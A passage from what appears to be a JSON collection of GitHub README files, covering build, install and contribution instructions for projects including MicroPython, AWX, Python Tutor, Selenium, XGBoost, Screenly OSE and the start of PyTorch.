a version of MicroPython that runs on Unix.\n- ports\/stm32\/ -- a version of MicroPython that runs on the PyBoard and similar\n  STM32 boards (using ST's Cube HAL drivers).\n- ports\/minimal\/ -- a minimal MicroPython port. Start with this if you want\n  to port MicroPython to another microcontroller.\n- tests\/ -- test framework and test scripts.\n- docs\/ -- user documentation in Sphinx reStructuredText format. Rendered\n  HTML documentation is available at http:\/\/docs.micropython.org.\n\nAdditional components:\n- ports\/bare-arm\/ -- a bare minimum version of MicroPython for ARM MCUs. Used\n  mostly to control code size.\n- ports\/teensy\/ -- a version of MicroPython that runs on the Teensy 3.1\n  (preliminary but functional).\n- ports\/pic16bit\/ -- a version of MicroPython for 16-bit PIC microcontrollers.\n- ports\/cc3200\/ -- a version of MicroPython that runs on the CC3200 from TI.\n- ports\/esp8266\/ -- a version of MicroPython that runs on Espressif's ESP8266 SoC.\n- ports\/esp32\/ -- a version of MicroPython that runs on Espressif's ESP32 SoC.\n- ports\/nrf\/ -- a version of MicroPython that runs on Nordic's nRF51 and nRF52 MCUs.\n- extmod\/ -- additional (non-core) modules implemented in C.\n- tools\/ -- various tools, including the pyboard.py module.\n- examples\/ -- a few example Python scripts.\n\nThe subdirectories above may include READMEs with additional info.\n\n\"make\" is used to build the components, or \"gmake\" on BSD-based systems.\nYou will also need bash, gcc, and Python 3.3+ available as the command `python3`\n(if your system only has Python 2.7 then invoke make with the additional option\n`PYTHON=python2`).\n\nThe MicroPython cross-compiler, mpy-cross\n-----------------------------------------\n\nMost ports require the MicroPython cross-compiler to be built first.  This\nprogram, called mpy-cross, is used to pre-compile Python scripts to .mpy\nfiles which can then be included (frozen) into the firmware\/executable for\na port.  To build mpy-cross use:\n\n    $ cd mpy-cross\n    $ make\n\nThe Unix version\n----------------\n\nThe \"unix\" port requires a standard Unix environment with gcc and GNU make.\nx86 and x64 architectures are supported (i.e. x86 32- and 64-bit), as well\nas ARM and MIPS. Making full-featured port to another architecture requires\nwriting some assembly code for the exception handling and garbage collection.\nAlternatively, fallback implementation based on setjmp\/longjmp can be used.\n\nTo build (see section below for required dependencies):\n\n    $ cd ports\/unix\n    $ make submodules\n    $ make\n\nThen to give it a try:\n\n    $ .\/micropython\n    >>> list(5 * x + y for x in range(10) for y in [4, 2, 1])\n\nUse `CTRL-D` (i.e. EOF) to exit the shell.\nLearn about command-line options (in particular, how to increase heap size\nwhich may be needed for larger applications):\n\n    $ .\/micropython --help\n\nRun complete testsuite:\n\n    $ make test\n\nUnix version comes with a builtin package manager called upip, e.g.:\n\n    $ .\/micropython -m upip install micropython-pystone\n    $ .\/micropython -m pystone\n\nBrowse available modules on\n[PyPI](https:\/\/pypi.python.org\/pypi?%3Aaction=search&term=micropython).\nStandard library modules come from\n[micropython-lib](https:\/\/github.com\/micropython\/micropython-lib) project.\n\nExternal dependencies\n---------------------\n\nBuilding MicroPython ports may require some dependencies installed.\n\nFor Unix port, `libffi` library and `pkg-config` tool are required. On\nDebian\/Ubuntu\/Mint derivative Linux distros, install `build-essential`\n(includes toolchain and make), `libffi-dev`, and `pkg-config` packages.\n\nOther dependencies can be built together with MicroPython. This may\nbe required to enable extra features or capabilities, and in recent\nversions of MicroPython, these may be enabled by default. To build\nthese additional dependencies, in the port directory you're\ninterested in (e.g. `ports\/unix\/`) first execute:\n\n    $ make submodules\n\nThis will fetch all the relevant git submodules (sub repositories) that\nthe port needs.  Use the same command to get the latest versions of\nsubmodules as they are updated from time to time. After that execute:\n\n    $ make deplibs\n\nThis will build all available dependencies (regardless whether they\nare used or not). If you intend to build MicroPython with additional\noptions (like cross-compiling), the same set of options should be passed\nto `make deplibs`. To actually enable\/disable use of dependencies, edit\n`ports\/unix\/mpconfigport.mk` file, which has inline descriptions of the options.\nFor example, to build SSL module (required for `upip` tool described above,\nand so enabled by dfeault), `MICROPY_PY_USSL` should be set to 1.\n\nFor some ports, building required dependences is transparent, and happens\nautomatically.  But they still need to be fetched with the `make submodules`\ncommand.\n\nThe STM32 version\n-----------------\n\nThe \"stm32\" port requires an ARM compiler, arm-none-eabi-gcc, and associated\nbin-utils.  For those using Arch Linux, you need arm-none-eabi-binutils,\narm-none-eabi-gcc and arm-none-eabi-newlib packages.  Otherwise, try here:\nhttps:\/\/launchpad.net\/gcc-arm-embedded\n\nTo build:\n\n    $ cd ports\/stm32\n    $ make submodules\n    $ make\n\nYou then need to get your board into DFU mode.  On the pyboard, connect the\n3V3 pin to the P1\/DFU pin with a wire (on PYBv1.0 they are next to each other\non the bottom left of the board, second row from the bottom).\n\nThen to flash the code via USB DFU to your device:\n\n    $ make deploy\n\nThis will use the included `tools\/pydfu.py` script.  If flashing the firmware\ndoes not work it may be because you don't have the correct permissions, and\nneed to use `sudo make deploy`.\nSee the README.md file in the ports\/stm32\/ directory for further details.\n\nContributing\n------------\n\nMicroPython is an open-source project and welcomes contributions. To be\nproductive, please be sure to follow the\n[Contributors' Guidelines](https:\/\/github.com\/micropython\/micropython\/wiki\/ContributorGuidelines)\nand the [Code Conventions](https:\/\/github.com\/micropython\/micropython\/blob\/master\/CODECONVENTIONS.md).\nNote that MicroPython is licenced under the MIT license, and all contributions\nshould follow this license.\n"},{"repo":"\/ansible\/awx","language":"JavaScript","readme_contents":"[![Gated by Zuul](https:\/\/zuul-ci.org\/gated.svg)](https:\/\/ansible.softwarefactory-project.io\/zuul\/status)\n\n<img src=\"https:\/\/raw.githubusercontent.com\/ansible\/awx-logos\/master\/awx\/ui\/client\/assets\/logo-login.svg?sanitize=true\" width=200 alt=\"AWX\" \/>\n\nAWX provides a web-based user interface, REST API, and task engine built on top of [Ansible](https:\/\/github.com\/ansible\/ansible). It is the upstream project for [Tower](https:\/\/www.ansible.com\/tower), a commercial derivative of AWX.  \n\nTo install AWX, please view the [Install guide](.\/INSTALL.md).\n\nTo learn more about using AWX, and Tower, view the [Tower docs site](http:\/\/docs.ansible.com\/ansible-tower\/index.html).\n\nThe AWX Project Frequently Asked Questions can be found [here](https:\/\/www.ansible.com\/awx-project-faq).\n\nThe AWX logos and branding assets are covered by [our trademark guidelines](https:\/\/github.com\/ansible\/awx-logos\/blob\/master\/TRADEMARKS.md).\n\nContributing\n------------\n\n- Refer to the [Contributing guide](.\/CONTRIBUTING.md) to get started developing, testing, and building AWX.\n- All code submissions are done through pull requests against the `devel` branch.\n- All contributors must use git commit --signoff for any commit to be merged, and agree that usage of --signoff constitutes agreement with the terms of [DCO 1.1](.\/DCO_1_1.md)\n- Take care to make sure no merge commits are in the submission, and use `git rebase` vs `git merge` for this reason.\n- If submitting a large code change, it's a good idea to join the `#ansible-awx` channel on irc.freenode.net, and talk about what you would like to do or add first. This not only helps everyone know what's going on, it also helps save time and effort, if the community decides some changes are needed.\n\nReporting Issues\n----------------\n\nIf you're experiencing a problem that you feel is a bug in AWX, or have ideas for how to improve AWX, we encourage you to open an issue, and share your feedback. But before opening a new issue, we ask that you please take a look at our [Issues guide](.\/ISSUES.md).\n\nCode of Conduct\n---------------\n\nWe ask all of our community members and contributors to adhere to the [Ansible code of conduct](http:\/\/docs.ansible.com\/ansible\/latest\/community\/code_of_conduct.html). If you have questions, or need assistance, please reach out to our community team at [codeofconduct@ansible.com](mailto:codeofconduct@ansible.com)   \n\nGet Involved\n------------\n\nWe welcome your feedback and ideas. Here's how to reach us with feedback and questions:\n\n- Join the `#ansible-awx` channel on irc.freenode.net\n- Join the [mailing list](https:\/\/groups.google.com\/forum\/#!forum\/awx-project) \n\nLicense\n-------\n\n[Apache v2](.\/LICENSE.md)\n\n"},{"repo":"\/pgbovine\/OnlinePythonTutor","language":"C","readme_contents":"Python Tutor -- http:\/\/pythontutor.com\/ -- helps people overcome a fundamental barrier to learning programming: understanding what happens as the computer executes each line of a program's source code. Using this tool, you can write Python, Java, JavaScript, TypeScript, Ruby, C, and C++ programs in your Web browser and visualize what the computer is doing step-by-step as it executes those programs.\n\nThis tool was created by [Philip Guo](http:\/\/pgbovine.net\/) in January 2010. [See project history](history.txt).\n\n[List of unsupported features and known bugs](https:\/\/github.com\/pgbovine\/OnlinePythonTutor\/blob\/master\/unsupported-features.md)\n\nThe latest development version of the code is in [v5-unity](v5-unity\/),\nalthough lots of legacy documentation still resides in [v3](v3\/).\n\n\n### Quick Start\n\nBY FAR the most preferred way to use Python Tutor is via the official website, since it contains the latest updates: http:\/\/pythontutor.com\/\n\nYou can use [iframe embedding](v3\/docs\/embedding-HOWTO.md) to easily embed visualizations on your webpage.\n\nIf you want to run locally on your own computer, to run Python visualizations try:\n\n```\npip install bottle # make sure the bottle webserver (http:\/\/bottlepy.org\/) is installed\ncd OnlinePythonTutor\/v5-unity\/\npython bottle_server.py\n```\n\nYou should see the visualizer at: http:\/\/localhost:8003\/visualize.html\n\n... and the live programming environment at: http:\/\/localhost:8003\/live.html \n\nHowever, it can be hard to run your own visualizer locally for\nnon-Python languages, since there are complex dependencies in v4-cokapi\/ that\nI haven't yet cleanly packaged up. By default, the local version you run will\n*call my own server to run the non-Python backends*, so please be mindful of\nyour bandwidth usage.\n\nNote: *I can't provide technical support for users who want to install Python Tutor on their own computers\/servers ([read details here](https:\/\/github.com\/pgbovine\/OnlinePythonTutor\/blob\/master\/unsupported-features.md)).*\n\nFor further directions, see [Overview for Developers](v3\/docs\/developer-overview.md) or explore the [rest of the docs](v3\/docs\/).\n\n\n### Acknowledgments\n\nFor code or security contributions:\n- Irene Chen - experimental holistic visualization mode - v3\/js\/holistic.js\n- John DeNero - helping with the official Python 3 port, bug fixes galore\n- Mark Liffiton - localStorage bug fix\n- Chris Meyers - custom visualizations such as v3\/matrix.py and v3\/htmlFrame.py\n- Brad Miller - adding pop-up question dialogs to visualizations, other bug fixes\n- David Pritchard and Will Gwozdz - Java visualizer and other frontend enhancements\n- Peter Robinson - v3\/make_visualizations.py\n- Peter Wentworth and his students - working on the original Python 3 fork circa 2010-2011\n- Security tips and vulnerability reports: Aaron E. (https:\/\/arinerron.com), Chris Horne (https:\/\/github.com\/lahwran), Joshua Landau (joshua@landau.ws), David Wyde (https:\/\/davidwyde.com\/)\n\nFor user testing and feedback from instructors' perspectives:\n- Ned Batchelder\n- Jennifer Campbell\n- John Dalbey\n- John DeNero\n- Fredo Durand\n- Michael Ernst\n- David Evans\n- Paul Gries\n- Mark Guzdial\n- Adam Hartz\n- Sean Lip\n- Fernando Perez\n- Tomas Lozano-Perez\n- Bertram Ludaescher\n- Brad Miller\n- Rob Miller\n- Peter Norvig\n- Andrew Petersen\n- David Pritchard\n- Suzanne Rivoire\n- Guido van Rossum\n- Peter Wentworth\n- David Wilkins\n\n... and many, many more!\n"},{"repo":"\/SeleniumHQ\/selenium","language":"Java","readme_contents":"Selenium [![Travis Status](https:\/\/travis-ci.com\/SeleniumHQ\/selenium.svg?branch=master)](\/\/travis-ci.com\/SeleniumHQ\/selenium\/builds) [![AppVeyor Status](https:\/\/ci.appveyor.com\/api\/projects\/status\/pg1f99p1aetp9mk9\/branch\/master?svg=true)](https:\/\/ci.appveyor.com\/project\/SeleniumHQ\/selenium\/branch\/master)\n========\n<a href=\"https:\/\/selenium.dev\"><img src=\"https:\/\/selenium.dev\/images\/selenium_logo_square_green.png\" width=\"180\" alt=\"Selenium\"\/><\/a>\n\nSelenium is an umbrella project encapsulating a variety of tools and\nlibraries enabling web browser automation. Selenium specifically\nprovides infrastructure for the [W3C WebDriver specification](https:\/\/w3c.github.io\/webdriver\/)\n\u2014 a platform and language-neutral coding interface compatible with all\nmajor web browsers.\n\nThe project is made possible by volunteer contributors who've\ngenerously donated thousands of hours in code development and upkeep.\n\nSelenium's source code is made available under the [Apache 2.0 license](https:\/\/github.com\/SeleniumHQ\/selenium\/blob\/master\/LICENSE).\n\n## Documentation\n\nNarrative documentation:\n\n* [User Manual](https:\/\/selenium.dev\/documentation\/)\n\nAPI documentation:\n\n* [C#](https:\/\/seleniumhq.github.io\/selenium\/docs\/api\/dotnet\/)\n* [JavaScript](https:\/\/seleniumhq.github.io\/selenium\/docs\/api\/javascript\/)\n* [Java](https:\/\/seleniumhq.github.io\/selenium\/docs\/api\/java\/index.html)\n* [Python](https:\/\/seleniumhq.github.io\/selenium\/docs\/api\/py\/)\n* [Ruby](https:\/\/seleniumhq.github.io\/selenium\/docs\/api\/rb\/)\n\n## Pull Requests\n\nPlease read [CONTRIBUTING.md](https:\/\/github.com\/SeleniumHQ\/selenium\/blob\/master\/CONTRIBUTING.md)\nbefore submitting your pull requests.\n\n## Building\n\nIn order to build Selenium, you'll generally use the `.\/go` command. `.\/go` is a Rake script,\nwhich wraps the main build too, `bazel`.\n\n### Bazel\n\n[Bazel](https:\/\/bazel.build\/) was built by the fine folks at Google. Bazel manages dependency \ndownloads, generates the Selenium binaries, executes tests and does it all rather quickly.\n\nMore detailed instructions for getting Bazel running are below, but if you can successfully get\nthe java and javascript folders to build without errors, you should be confident that you have the \ncorrect binaries on your system.\n\n### Before Building\n\nEnsure that you have Chrome installed and the\n[`chromedriver` ](https:\/\/chromedriver.chromium.org\/downloads) that matches\nyour Chrome version available on your `$PATH`. You may have to update this from time to time.\n\n### Common Build Targets\n\nTo build the most commonly-used modules of Selenium from source, execute this command from the root\nproject folder:\n\n```sh\nbazel build java\/...\n```\n\nIf you have some extra time on your hands, you can run this command to get extra confidence\nthat your build is successful. This will do a lot more work to build all the javascript artifacts:\n\n```sh\nbazel build java\/... javascript\/...\n```\n\nIf you're making changes to the java\/ or javascript\/ folders in this project, and this command\nexecutes without errors, you should be able to create a PR of your changes. (See also CONTRIBUTING.md)\n\n### Build Details ###\n\n- Bazel files are called BUILD.bazel\n- [crazyfun](https:\/\/github.com\/SeleniumHQ\/selenium\/wiki\/Crazy-Fun-Build) build files are called \n*build.desc*. This is an older build system, still in use in the project\n- There is also a main Rakefile\n\nThe order the modules are built is determined by the build system. If you want to build an \nindividual module (assuming all dependent modules have previously been built), try the following:\n\n```sh\n.\/go javascript\/atoms:test:run\n```\n\nIn this case, `javascript\/atoms` is the module directory,\n`test` is a target in that directory's `build.desc` file,\nand `run` is the action to run on that target.\n\nAs you see *build targets* scroll past in the log,\nyou may want to run them individually. crazyfun can run them individually,\nby target name, as long as `:run` is appended (see above).\n\nTo list all available targets, you can append the `-T` flag:\n\n```sh\n.\/go -T\n```\n\n## Requirements\n\n* The latest version of the [Java 11 OpenJDK](http:\/\/www.oracle.com\/technetwork\/java\/javase\/downloads\/index.html)\n* `java` and `jar` on the PATH (make sure you use `java` executable from JDK but not JRE). \n  * To test this, try running the command `javac`. This command won't exist if you only have the JRE\n  installed. If you're met with a list of command-line options, you're referencing the JDK properly.\n* [Python](https:\/\/www.python.org\/)\n* `python` on the PATH\n* [The Requests Library](http:\/\/python-requests.org) for Python: `pip install requests`\n* MacOS users should have the latest version of Xcode installed, including the command-line tools.\nThe following command should work:\n\n```bash\nxcode-select --install\n```\n\nAlthough the build system is based on rake, it's **strongly advised**\nto rely on the version of JRuby in `third_party\/` that is invoked by\n`go`.  The only developer type who would want to deviate from this is\nthe \u201cbuild maintainer\u201d who's experimenting with a JRuby upgrade.\n\n### Optional Requirements\n\n* Python 3.4+ (if you want to run Python tests for this version)\n* Ruby 2.0\n\n### Internet Explorer Driver\n\nIf you plan to compile the\n[IE driver](https:\/\/github.com\/SeleniumHQ\/selenium\/wiki\/InternetExplorerDriver),\nyou also need:\n\n* [Visual Studio 2008](https:\/\/www.visualstudio.com\/)\n* 32 and 64 bit cross compilers\n\nThe build will work on any platform, but the tests for IE will be\nskipped silently if you are not building on Windows.\n\n## Common Tasks (Bazel)\n\nTo build the bulk of the Selenium binaries from source, run the \nfollowing command from the root folder:\n\n```sh\nbazel build java\/... javascript\/...\n```\n\nTo build the grid deployment jar, run this command:\n\n```sh\nbazel build grid\n```\n\nTo run tests within a particular area of the project, use the \"test\" command, followed\nby the folder or target. Tests are tagged with \"small\", \"medium\", or \"large\", and can be filtered\nwith the `--test_size_filters` option:\n\n```sh\nbazel test --test_size_filters=small,medium java\/...\n```\n\nBazel's \"test\" command will run *all* tests in the package, including integration tests. Expect\nthe ```test java\/...``` to launch browsers and consume a considerable amount of time and resources.\n\n## Tour\n\nThe code base is generally segmented around the languages used to\nwrite the component.  Selenium makes extensive use of JavaScript, so\nlet's start there.  Working on the JavaScript is easy.  First of all,\nstart the development server:\n\n```sh\n.\/go debug-server\n```\n\nNow, navigate to\n[http:\/\/localhost:2310\/javascript](http:\/\/localhost:2310\/javascript).\nYou'll find the contents of the `javascript\/` directory being shown.\nWe use the [Closure\nLibrary](https:\/\/developers.google.com\/closure\/library\/) for\ndeveloping much of the JavaScript, so now navigate to\n[http:\/\/localhost:2310\/javascript\/atoms\/test](http:\/\/localhost:2310\/javascript\/atoms\/test).\n\nThe tests in this directory are normal HTML files with names ending\nwith `_test.html`.  Click on one to load the page and run the test. You\ncan run all the JavaScript tests using:\n\n```sh\n.\/go test_javascript\n```\n\n## Maven POM files\n\nHere is the [public Selenium Maven\nrepository](http:\/\/repo1.maven.org\/maven2\/org\/seleniumhq\/selenium\/).\n\n## Build Output\n\n`.\/go` only makes a top-level `build` directory.  Outputs are placed\nunder that relative to the target name. Which is probably best\ndescribed with an example.  For the target:\n\n```sh\n.\/go \/\/java\/client\/src\/org\/openqa\/selenium:selenium-api\n```\n\nThe output is found under:\n\n```sh\nbuild\/java\/client\/src\/org\/openqa\/selenium\/selenium-api.jar\n```\n\nIf you watch the build, each step should print where its output is\ngoing.  Java test outputs appear in one of two places: either under\n`build\/test_logs` for [JUnit](http:\/\/junit.org\/) or in\n`build\/build_log.xml` for [TestNG](http:\/\/testng.org\/doc\/index.html)\ntests.  If you'd like the build to be chattier, just append `log=true`\nto the build command line.\n\n# Help with `go`\n\nMore general, but basic, help for `go`\u2026\n\n```sh\n.\/go --help\n```\n\n`go` is just a wrapper around\n[Rake](http:\/\/rake.rubyforge.org\/), so you can use the standard\ncommands such as `rake -T` to get more information about available\ntargets.\n\n## Maven _per se_\n\nIf it is not clear already, Selenium is not built with Maven. It is\nbuilt with `bazel`, though that is invoked with `go` as outlined above, \nso you do not really have to learn too much about that.\n\nThat said, it is possible to relatively quickly build Selenium pieces\nfor Maven to use. You are only really going to want to do this when\nyou are testing the cutting-edge of Selenium development (which we\nwelcome) against your application.  Here is the quickest way to build\nand deploy into your local maven repository (`~\/.m2\/repository`), while\nskipping Selenium's own tests.\n\n```sh\n.\/go maven-install\n```\n\nThe maven jars should now be in your local `~\/.m2\/repository`.\n\n## Useful Resources\n\nRefer to the [Building Web\nDriver](https:\/\/github.com\/SeleniumHQ\/selenium\/wiki\/Building-WebDriver)\nwiki page for the last word on building the bits and pieces of Selenium.\n\n## Bazel Installation\/Troubleshooting\n\n### MacOS\n\n#### bazelisk \n\nBazelisk is a Mac-friendly launcher for Bazel. To install, follow these steps:\n\n```sh\nbrew tap bazelbuild\/tap && \\\nbrew uninstall bazel; \\\nbrew install bazelbuild\/tap\/bazelisk\n```\n\n#### Xcode\n\nIf you're getting errors that mention Xcode, you'll need to install the command-line tools.\n\nBazel for Mac requires some additional steps to configure properly. First things first: use\nthe Bazelisk project (courtesy of philwo), a pure golang implementation of Bazel. In order to \ninstall Bazelisk, first verify that your Xcode will cooperate: execute the following command:\n\n`xcode-select -p`\n\nIf the value is `\/Applications\/Xcode.app\/Contents\/Developer\/`, you can proceed with bazelisk\ninstallation. If, however, the return value is `\/Library\/Developer\/CommandLineTools\/`, you'll\nneed to redirect the Xcode system to the correct value. \n\n```\nsudo xcode-select -s \/Applications\/Xcode.app\/Contents\/Developer\/\nsudo xcodebuild -license\n```\n\nThe first command will prompt you for a password. The second step requires you to read a new Xcode \nlicense, and then accept it by typing \"agree\".\n\n(Thanks to [this thread](https:\/\/github.com\/bazelbuild\/bazel\/issues\/4314) for these steps)\n\n"},{"repo":"\/dmlc\/xgboost","language":"C++","readme_contents":"<img src=https:\/\/raw.githubusercontent.com\/dmlc\/dmlc.github.io\/master\/img\/logo-m\/xgboost.png width=135\/>  eXtreme Gradient Boosting\n===========\n[![Build Status](https:\/\/xgboost-ci.net\/job\/xgboost\/job\/master\/badge\/icon?style=plastic)](https:\/\/xgboost-ci.net\/blue\/organizations\/jenkins\/xgboost\/activity)\n[![Build Status](https:\/\/img.shields.io\/travis\/dmlc\/xgboost.svg?label=build&logo=travis&branch=master)](https:\/\/travis-ci.org\/dmlc\/xgboost)\n[![Build Status](https:\/\/ci.appveyor.com\/api\/projects\/status\/5ypa8vaed6kpmli8?svg=true)](https:\/\/ci.appveyor.com\/project\/tqchen\/xgboost)\n[![Documentation Status](https:\/\/readthedocs.org\/projects\/xgboost\/badge\/?version=latest)](https:\/\/xgboost.readthedocs.org)\n[![GitHub license](http:\/\/dmlc.github.io\/img\/apache2.svg)](.\/LICENSE)\n[![CRAN Status Badge](http:\/\/www.r-pkg.org\/badges\/version\/xgboost)](http:\/\/cran.r-project.org\/web\/packages\/xgboost)\n[![PyPI version](https:\/\/badge.fury.io\/py\/xgboost.svg)](https:\/\/pypi.python.org\/pypi\/xgboost\/)\n\n[Community](https:\/\/xgboost.ai\/community) |\n[Documentation](https:\/\/xgboost.readthedocs.org) |\n[Resources](demo\/README.md) |\n[Contributors](CONTRIBUTORS.md) |\n[Release Notes](NEWS.md)\n\nXGBoost is an optimized distributed gradient boosting library designed to be highly ***efficient***, ***flexible*** and ***portable***.\nIt implements machine learning algorithms under the [Gradient Boosting](https:\/\/en.wikipedia.org\/wiki\/Gradient_boosting) framework.\nXGBoost provides a parallel tree boosting (also known as GBDT, GBM) that solve many data science problems in a fast and accurate way.\nThe same code runs on major distributed environment (Kubernetes, Hadoop, SGE, MPI, Dask) and can solve problems beyond billions of examples.\n\nLicense\n-------\n\u00a9 Contributors, 2019. Licensed under an [Apache-2](https:\/\/github.com\/dmlc\/xgboost\/blob\/master\/LICENSE) license.\n\nContribute to XGBoost\n---------------------\nXGBoost has been developed and used by a group of active community members. Your help is very valuable to make the package better for everyone.\nCheckout the [Community Page](https:\/\/xgboost.ai\/community)\n\nReference\n---------\n- Tianqi Chen and Carlos Guestrin. [XGBoost: A Scalable Tree Boosting System](http:\/\/arxiv.org\/abs\/1603.02754). In 22nd SIGKDD Conference on Knowledge Discovery and Data Mining, 2016\n- XGBoost originates from research project at University of Washington.\n\nSponsors\n--------\nBecome a sponsor and get a logo here. See details at [Sponsoring the XGBoost Project](https:\/\/xgboost.ai\/sponsors). The funds are used to defray the cost of continuous integration and testing infrastructure (https:\/\/xgboost-ci.net).\n\n## Open Source Collective sponsors\n[![Backers on Open Collective](https:\/\/opencollective.com\/xgboost\/backers\/badge.svg)](#backers) [![Sponsors on Open Collective](https:\/\/opencollective.com\/xgboost\/sponsors\/badge.svg)](#sponsors)\n\n### Sponsors\n[[Become a sponsor](https:\/\/opencollective.com\/xgboost#sponsor)]\n\n<!--<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/0\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/0\/avatar.svg\"><\/a>-->\n<a href=\"https:\/\/www.nvidia.com\/en-us\/\" target=\"_blank\"><img src=\"https:\/\/raw.githubusercontent.com\/xgboost-ai\/xgboost-ai.github.io\/master\/images\/sponsors\/nvidia.jpg\" alt=\"NVIDIA\" width=\"72\" height=\"72\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/1\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/1\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/2\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/2\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/3\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/3\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/4\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/4\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/5\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/5\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/6\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/6\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/7\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/7\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/8\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/8\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/xgboost\/sponsor\/9\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/sponsor\/9\/avatar.svg\"><\/a>\n\n### Backers\n[[Become a backer](https:\/\/opencollective.com\/xgboost#backer)]\n\n<a href=\"https:\/\/opencollective.com\/xgboost#backers\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/xgboost\/backers.svg?width=890\"><\/a>\n\n## Other sponsors\nThe sponsors in this list are donating cloud hours in lieu of cash donation.\n\n<a href=\"https:\/\/aws.amazon.com\/\" target=\"_blank\"><img src=\"https:\/\/raw.githubusercontent.com\/xgboost-ai\/xgboost-ai.github.io\/master\/images\/sponsors\/aws.png\" alt=\"Amazon Web Services\" width=\"72\" height=\"72\"><\/a>\n"},{"repo":"\/Screenly\/screenly-ose","language":"CSS","readme_contents":"[![Build Status](https:\/\/travis-ci.org\/Screenly\/screenly-ose.svg?branch=master)](https:\/\/travis-ci.org\/Screenly\/screenly-ose)\n[![Codacy Badge](https:\/\/api.codacy.com\/project\/badge\/Grade\/5905ebcf4aab4220ad9fdf3fb679c49d)](https:\/\/www.codacy.com\/app\/vpetersson\/screenly-ose?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=Screenly\/screenly-ose&amp;utm_campaign=Badge_Grade)\n\n# Screenly OSE - Digital Signage for the Raspberry Pi\n\n[Which Screenly version is right for me?](https:\/\/www.screenly.io\/screenly-ose-vs-pro\/)\n\n**PLEASE NOTE:** Screenly OSE and the commercial version of Screenly (formerly known as Screenly Pro) are **two completely separate products**. They **do not share any code base and behave very differently** both with regards to management and performance. Hence do not use one to evaluate the other.\n\n## Disk images\n\nThe recommended installation method is to grab the latest disk image from [here](https:\/\/github.com\/Screenly\/screenly-ose\/releases).\n\n## Installing on Raspbian\n\nThe tl;dr for installing Screenly OSE on [Raspbian Lite](https:\/\/www.raspberrypi.org\/downloads\/raspbian\/) is:\n\n```\n$ bash <(curl -sL https:\/\/www.screenly.io\/install-ose.sh)\n```\n\n**This installation will take 15 minutes to several hours**, depending on variables such as:\n\n * The Raspberry Pi hardware version\n * The SD card\n * The internet connection\n\nDuring ideal conditions (Raspberry Pi 3 Model B+, class 10 SD card and fast internet connection), the installation normally takes 15-30 minutes. On a Raspberry Pi Zero or Raspberry Pi Model B with a class 4 SD card, the installation will take hours. As such, it is usually a lot faster to use the provided disk images.\n\n## Upgrading on Screenly OSE\n\nThe releases are based on the [Sprints](https:\/\/github.com\/Screenly\/screenly-ose\/projects). At the end of each sprint, we merge the master branch (also known as the developer version), into the production branch and generate a new disk image.\n\nShould you want to upgrade to the latest development version (for instance if you want to try a bug-fix), you can do this by simply re-running the installation script and select that you want to install the development version. Re-running the installation script should normally not take more than a few minutes (depending on how much changed).\n\nTo learn more about Screenly, please visit the official website at [Screenly.io](http:\/\/www.screenly.io).\n\n[![An introduction to digital signage with Screenly OSE](http:\/\/img.youtube.com\/vi\/FQte5yP0azE\/0.jpg)](http:\/\/www.youtube.com\/watch?v=FQte5yP0azE)\n\nQuick links:\n\n * [FAQ](https:\/\/support.screenly.io\/hc\/en-us\/sections\/202652366-Frequently-Asked-Questions-FAQ-)\n * [Screenly OSE Forum](https:\/\/forums.screenly.io\/c\/screenly-ose)\n * [Screenly OSE Home](https:\/\/www.screenly.io\/ose\/)\n * [Live Demo](http:\/\/ose.demo.screenlyapp.com\/)\n * [QA Checklist](https:\/\/www.forgett.com\/checklist\/1789089623)\n * [API Docs](http:\/\/ose.demo.screenlyapp.com\/api\/docs\/)\n\nScreenly OSE works on all Raspberry Pi versions, including Raspberry Pi Zero and Raspberry Pi 3 Model B.\n\n## Dockerized Development Environment\n\nTo simplify development of the server module of Screenly OSE, we've created a Docker container. This is intended to run on your local machine with the Screenly OSE repository mounted as a volume.\n\nAssuming you're in the source code repository, simply run:\n\n```\n$ docker run --rm -it \\\n    --name=screenly-dev \\\n    -e 'LISTEN=0.0.0.0' \\\n    -p 8080:8080 \\\n    -v $(pwd):\/home\/pi\/screenly \\\n    screenly\/ose-dev-server\n```\n\n## Running the Unit Tests\n\n    nosetests --with-doctest\n"},{"repo":"\/pytorch\/pytorch","language":"C++","readme_contents":"![PyTorch Logo](https:\/\/github.com\/pytorch\/pytorch\/blob\/master\/docs\/source\/_static\/img\/pytorch-logo-dark.png)\n\n--------------------------------------------------------------------------------\n\nPyTorch is a Python package that provides two high-level features:\n- Tensor computation (like NumPy) with strong GPU acceleration\n- Deep neural networks built on a tape-based autograd system\n\nYou can reuse your favorite Python packages such as NumPy, SciPy and Cython to extend PyTorch when needed.\n\n- [More about PyTorch](#more-about-pytorch)\n- [Installation](#installation)\n  - [Binaries](#binaries)\n  - [From Source](#from-source)\n  - [Docker Image](#docker-image)\n  - [Building the Documentation](#building-the-documentation)\n  - [Previous Versions](#previous-versions)\n- [Getting Started](#getting-started)\n- [Communication](#communication)\n- [Releases 